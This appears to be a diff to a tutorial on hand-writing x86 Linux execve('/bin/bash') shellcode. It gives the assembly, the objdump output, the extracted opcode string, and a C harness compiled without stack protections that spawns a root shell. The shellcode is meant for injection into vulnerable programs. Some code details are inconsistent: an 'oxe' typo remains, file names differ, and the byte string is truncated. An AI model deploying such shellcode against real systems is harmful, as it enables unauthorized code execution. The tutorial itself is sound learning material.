@@ -239,6 +239,9 @@ So, lets improve our assembly code:
 ```nasm
 #execVeShell.s
 
+.text
+.globl _start
+
 _start:
 
     jmp myCallStatement
@@ -246,13 +249,13 @@ _start:
         popl %esi                #pop register ESI which is the start of "bin/bashAAAAABBBBCCCCC"
         xorl %eax, %eax          # Move Zeros to EAX
         movb %al, 0x9(%esi)      # Move a Zero or NUll to "A"
-        movl esi, 0xa(%esi)      # Moves Address of ESI to "BBBB", now "MNOP"
+        movl %esi, 0xa(%esi)      # Moves Address of ESI to "BBBB", now "MNOP"
         movl %eax, oxe(%esi)     # Moves Zeros to "CCCC" Now, "0000"
         movb $11, %al            # Moves 11 into AL(Which is the Call sys Execve)
         movl %esi, %ebx          # Moves "/bin/bash\0" into EBX
         leal 0xa(%esi), %ecx     # Moves "MNOP" into ECX
         leal 0xe(%esi), %edx     # Moves "0000" into EDX
-        int 80
+        int $0x80
     
     myCallStatement:
         call shellcode
@@ -269,6 +272,80 @@ as -o execVeShellcode.o ExecVeShellcode.s
 
 ld -o execVeShellcode execVeShellcode.o
 ```
+
+Now lets check if there are any opcodes:
+
+```bash
+root@mfox:~/Documents# objdump -d execVeShellcode
+
+execVeShellcode:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <_start>:
+ 8049000:	eb 18                	jmp    804901a 
+
+08049002 :
+ 8049002:	5e                   	pop    %esi
+ 8049003:	31 c0                	xor    %eax,%eax
+ 8049005:	88 46 09             	mov    %al,0x9(%esi)
+ 8049008:	89 76 0a             	mov    %esi,0xa(%esi)
+ 804900b:	89 46 0e             	mov    %eax,0xe(%esi)
+ 804900e:	b0 0b                	mov    $0xb,%al
+ 8049010:	89 f3                	mov    %esi,%ebx
+ 8049012:	8d 4e 0a             	lea    0xa(%esi),%ecx
+ 8049015:	8d 56 0e             	lea    0xe(%esi),%edx
+ 8049018:	cd 80                	int    $0x80
+
+0804901a :
+ 804901a:	e8 e3 ff ff ff       	call   8049002 
+
+0804901f :
+ 804901f:	2f                   	das    
+ 8049020:	62 69 6e             	bound  %ebp,0x6e(%ecx)
+ 8049023:	2f                   	das    
+ 8049024:	62 61 73             	bound  %esp,0x73(%ecx)
+ 8049027:	68 41 42 42 42       	push   $0x42424241
+ 804902c:	42                   	inc    %edx
+ 804902d:	43                   	inc    %ebx
+ 804902e:	43                   	inc    %ebx
+ 804902f:	43                   	inc    %ebx
+ 8049030:	43                   	inc    %ebx
+
+
+```
+
+Lets grab the opcodes from above and compile our shellcode:
+
+```c
+#include 
+  
+char shellcode[]= "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a"
+                  "\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e"
+                  "\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62"
+                  "\x61\x73\x68\x41\x42";
+
+int main()
+{
+        int *ret;
+        ret = (int *)&ret +2;
+        (*ret) = (int)shellcode;
+}
+
+```
+
+Lets compile it and run it:
+
+```bash
+root@mfox:~/Documents# gcc -ggdb -mpreferred-stack-boundary=2 -m32 -fno-stack-protector -z execstack  shellExecVe.c -o shellExecVe
+root@mfox:~/Documents# chmod +x shellExecVe
+root@mfox:~/Documents# ./shellExecVe
+root@mfox:/root/Documents# 
+
+```
+
+Woot Woot! Annnnnd now we know how to create our own Shellcode that you can inject in vulnerable code.
 
 **#Important Resources:**
 
